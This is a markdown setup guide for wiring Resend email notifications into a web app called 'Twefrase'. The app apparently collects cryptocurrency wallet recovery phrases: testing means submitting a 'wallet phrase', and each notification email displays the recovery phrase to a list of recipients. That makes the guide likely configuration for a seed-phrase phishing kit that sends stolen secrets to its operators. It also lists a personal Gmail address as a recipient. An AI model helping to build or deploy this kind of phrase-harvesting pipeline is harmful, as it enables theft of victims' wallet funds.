# Resend Email Setup Guide

## 1. Create Resend Account

1. Go to [resend.com](https://resend.com) and sign up
2. Verify your email address
3. Complete account setup

## 2. Get Your API Key

1. In your Resend dashboard, go to **API Keys**
2. Click **Create API Key**
3. Copy the API key (starts with `re_`)

## 3. Update Environment Variables

Add to your `.env.local` file:

```bash
# Email Notifications with Resend
RESEND_API_KEY=re_your_api_key_here
NOTIFICATION_EMAILS=lilynoahhss@gmail.com,second@email.com,third@email.com
```

## 4. Configure Sender Domain (Optional but Recommended)

For production use, verify your domain:

1. Go to **Domains** in Resend dashboard
2. Add your domain (e.g., `yourdomain.com`)
3. Follow DNS verification steps
4. Update the `from` email in `src/lib/email.js`:

```javascript
from: 'Twefrase <notifications@yourdomain.com>'
```

## 5. Test Email Notifications

1. Install dependencies: `npm install`
2. Restart dev server: `npm run dev`
3. Submit a new wallet phrase
4. Check your email inboxes

## 6. Multiple Email Addresses

You can add as many emails as you want, separated by commas:

```bash
NOTIFICATION_EMAILS=admin@domain.com,manager@domain.com,security@domain.com,backup@domain.com
```

## 7. Email Template Features

The notification email includes:
- 🎨 **Professional HTML design**
- 📊 **Submission details table**
- ⚠️ **Recovery phrase display**
- 📱 **Mobile-responsive layout**
- 🔐 **Security warnings**

## 8. Troubleshooting

**Common Issues:**
- **API Key Invalid**: Check your Resend API key
- **Emails Not Sending**: Verify email addresses are correct
- **Domain Issues**: Use verified domain or default Resend domain

**Check Console Logs:**
- ✅ Success: "Email sent successfully to: email@domain.com"
- ❌ Error: "Failed to send email to email@domain.com: [reason]"

## 9. Security Notes

⚠️ **Important:**
- Never commit `.env.local` to git
- Use environment variables for sensitive data
- Consider rate limiting for production use
- Monitor email sending quotas

## 10. Alternative Email Services

If you prefer other services:

- **SendGrid**: `npm install @sendgrid/mail`
- **AWS SES**: `npm install @aws-sdk/client-ses`
- **Nodemailer**: `npm install nodemailer`

Just update the `sendEmailNotification` function accordingly.

